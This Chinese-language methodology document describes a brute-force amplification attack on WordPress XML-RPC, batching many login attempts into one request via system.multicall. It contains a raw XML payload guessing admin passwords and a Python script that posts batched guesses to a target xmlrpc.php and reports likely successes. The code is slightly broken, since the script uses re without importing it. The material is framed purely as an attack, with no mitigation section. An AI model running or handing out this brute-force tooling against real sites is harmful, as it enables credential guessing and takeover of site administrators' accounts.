# XML-RPC 暴力破解放大攻击方法论

## 1. 技术概述

### 1.1 漏洞原理

WordPress XML-RPC 暴力破解放大攻击是利用 WordPress XML-RPC 接口的 `system.multicall` 方法，将多个认证请求打包到单个 HTTP 请求中，从而实现暴力破解攻击的放大效应。

**本质原因：**
- `system.multicall` 允许批量执行多个方法调用
- 每个方法调用可以独立进行认证
- 认证失败状态在请求间不共享
- 无速率限制或请求计数限制

### 1.2 放大效应

| 攻击方式 | 请求数 | 认证尝试数 | 放大倍数 |
|----------|--------|-----------|----------|
| 传统暴力破解 | 1000 | 1000 | 1x |
| XML-RPC multicall | 20 | 1000 | 50x |
| XML-RPC multicall | 2 | 1000 | 500x |

---

## 2. 攻击方法

### 2.1 基础 Multicall 攻击

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value><array><data>
        <value><struct>
          <member><name>methodName</name><value>wp.getUsersBlogs</value></member>
          <member><name>params</name><value><array><data>
            <value>admin</value>
            <value>password1</value>
          </data></array></value></member>
        </struct></value>
        <value><struct>
          <member><name>methodName</name><value>wp.getUsersBlogs</value></member>
          <member><name>params</name><value><array><data>
            <value>admin</value>
            <value>password2</value>
          </data></array></value></member>
        </struct></value>
      </data></array></value>
    </param>
  </params>
</methodCall>
```

### 2.2 Python 攻击脚本

```python
#!/usr/bin/env python3
import requests
import xml.etree.ElementTree as ET

TARGET = "http://target.com/xmlrpc.php"
USERNAME = "admin"
PASSWORDS = ["password123", "admin123", "123456", "qwerty", "letmein"]

def build_multicall_payload(username, passwords):
    calls = []
    for pwd in passwords:
        call = {
            'methodName': 'wp.getUsersBlogs',
            'params': [username, pwd]
        }
        calls.append(call)
    
    xml = '<?xml version="1.0"?>\n<methodCall>\n'
    xml += '<methodName>system.multicall</methodName>\n'
    xml += '<params><param><value><array><data>\n'
    
    for call in calls:
        xml += '<value><struct>\n'
        xml += f'<member><name>methodName</name><value>{call["methodName"]}</value></member>\n'
        xml += '<member><name>params</name><value><array><data>\n'
        for param in call['params']:
            xml += f'<value><string>{param}</string></value>\n'
        xml += '</data></array></value></member>\n'
        xml += '</struct></value>\n'
    
    xml += '</data></array></value></param>\n'
    xml += '</params>\n</methodCall>'
    return xml

def attack():
    payload = build_multicall_payload(USERNAME, PASSWORDS)
    response = requests.post(TARGET, data=payload, headers={'Content-Type': 'text/xml'})
    
    # 解析响应
    for match in re.finditer('<value><string>(.*?)</string></value>', response.text):
        print(f"[+] Possible success: {match.group(1)}")

attack()
```

---

## 3. 参考资源

- [OWASP Brute Force](https://owasp.org/www-community/attacks/Brute_force_attack)
- [WordPress XML-RPC Security](https://developer.wordpress.org/plugins/security/securing-output-in-wordpress/)
